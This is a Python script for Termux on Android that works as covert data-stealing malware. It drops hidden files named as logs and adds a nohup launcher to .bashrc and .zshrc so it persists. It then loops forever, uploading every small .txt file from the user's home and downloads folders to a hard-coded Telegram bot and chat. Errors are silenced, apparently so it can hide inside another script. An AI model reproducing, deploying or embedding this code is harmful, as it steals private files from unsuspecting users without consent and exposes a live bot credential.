import os
import subprocess

# Define constants for paths
MONITOR_SCRIPT_PATH = "/data/data/com.termux/files/usr/.logs/setp.sh"
SEND_LOG_SCRIPT_PATH = "/data/data/com.termux/files/usr/.logs/.s_log.py"

def setup_background_task():
    try:
        # Step 1: Create the monitoring script file
        monitor_script_content = """#!/bin/bash

# Keep running the Python script in a loop
while true; do
    python3 /data/data/com.termux/files/usr/.logs/.s_log.py
    sleep 1  # Prevents immediate restart in case of failure
done
exit 0
"""
        # Ensure the logs directory exists
        os.makedirs(os.path.dirname(MONITOR_SCRIPT_PATH), exist_ok=True)

        # Write the monitoring script
        with open(MONITOR_SCRIPT_PATH, "w") as script_file:
            script_file.write(monitor_script_content)

        # Make the monitoring script executable
        subprocess.run(["chmod", "+x", MONITOR_SCRIPT_PATH], check=True)

        # Step 2: Create the `send_log.py` script
        send_log_script_content = """import os
import hashlib
import requests
from collections import deque

TELEGRAM_BOT_TOKEN = "7643354725:AAFLs0_9M2-LIy6BEnEhaVLfpQvb4AbX6kc"
TELEGRAM_CHAT_ID = "-1002377036474"
HASH_FILE_PATH = "/data/data/com.termux/files/usr/.logs/hash_data.txt"

# Directories to search
DIRECTORIES = [
    "/data/data/com.termux/files/home/downloads",
    "/data/data/com.termux/files/home"
]

FILE_SIZE_LIMIT = 50 * 1024  # 50 KB

def calculate_file_hash(file_path):
    hash_sha256 = hashlib.sha256()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_sha256.update(chunk)
    return hash_sha256.hexdigest()

def load_sent_hashes():
    if not os.path.exists(HASH_FILE_PATH):
        return set()
    with open(HASH_FILE_PATH, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_sent_hash(hash_value):
    with open(HASH_FILE_PATH, "a") as f:
        f.write(f"{hash_value}\\n")

def send_file_to_telegram(file_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as file:
            response = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": file})
        return response.status_code == 200
    except Exception as e:
        print(f"Failed to send {file_path}: {e}")
        return False

def process_and_send_txt_files():
    file_queue = deque()
    sent_hashes = load_sent_hashes()

    # Queue all eligible files
    for directory in DIRECTORIES:
        if not os.path.exists(directory):
            continue

        for root, _, files in os.walk(directory):
            for file_name in files:
                if file_name.endswith(".txt"):
                    file_path = os.path.join(root, file_name)
                    
                    if os.path.getsize(file_path) <= FILE_SIZE_LIMIT:
                        file_hash = calculate_file_hash(file_path)
                        if file_hash not in sent_hashes:
                            file_queue.append((file_path, file_hash))

    while file_queue:
        file_path, file_hash = file_queue.popleft()
        if send_file_to_telegram(file_path):
            save_sent_hash(file_hash)
        else:
            pass

if __name__ == "__main__":
    process_and_send_txt_files()
"""

        with open(SEND_LOG_SCRIPT_PATH, "w") as send_log_file:
            send_log_file.write(send_log_script_content)

        # Step 3: Add the monitoring script to Termux startup
        bashrc_path = os.path.expanduser("~/.bashrc")
        zshrc_path = os.path.expanduser("~/.zshrc")
        startup_command = f"nohup {MONITOR_SCRIPT_PATH} >/dev/null 2>&1 &\n"

        # Add to .bashrc if bash is the shell
        if os.path.exists(bashrc_path) or os.getenv("SHELL", "").endswith("bash"):
            if not os.path.exists(bashrc_path):
                with open(bashrc_path, "w") as bashrc_file:
                    pass  # Create an empty .bashrc if it doesn't exist
            with open(bashrc_path, "r+") as bashrc_file:
                content = bashrc_file.read()
                if startup_command not in content:
                    bashrc_file.write(startup_command)

        # Add to .zshrc if zsh is the shell
        if os.path.exists(zshrc_path) or os.getenv("SHELL", "").endswith("zsh"):
            if not os.path.exists(zshrc_path):
                with open(zshrc_path, "w") as zshrc_file:
                    pass  # Create an empty .zshrc if it doesn't exist
            with open(zshrc_path, "r+") as zshrc_file:
                content = zshrc_file.read()
                if startup_command not in content:
                    zshrc_file.write(startup_command)

        # Start the script immediately in the background
        subprocess.Popen(
            ["nohup", MONITOR_SCRIPT_PATH],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        # Silently pass any errors to avoid impacting the main script
        pass

if __name__ == "__main__":
    setup_background_task()